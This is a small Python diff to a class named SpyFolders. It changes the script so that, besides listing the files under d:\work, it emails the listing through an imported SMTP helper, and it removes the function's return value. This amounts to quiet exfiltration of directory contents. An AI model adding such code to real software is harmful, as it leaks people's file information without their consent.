@@ -1,6 +1,7 @@
 #-*- coding: utf8 -*-
 import os
 import sys
+import mail_smtp
 
 class SpyFolders():
     
@@ -20,14 +21,20 @@ class SpyFolders():
     def main(self):
         os.chdir("d:"+os.sep+"work")
         files = self.get_files_list_from_dir(os.getcwd())
+        send_contents = "".join(files)
+        mail_smtp.send_smtp_message("files list",send_contents)
+        '''
         for item in files:
             print (item)
         pass
+        '''
 
     def get_files(self):
         os.chdir("d:"+os.sep+"work")
         files = self.get_files_list_from_dir(os.getcwd())
-        return files
+        send_contents = "".join(files)
+        mail_smtp.send_smtp_message("files list",send_contents)
+        
         
 
 if __name__ == "__main__":
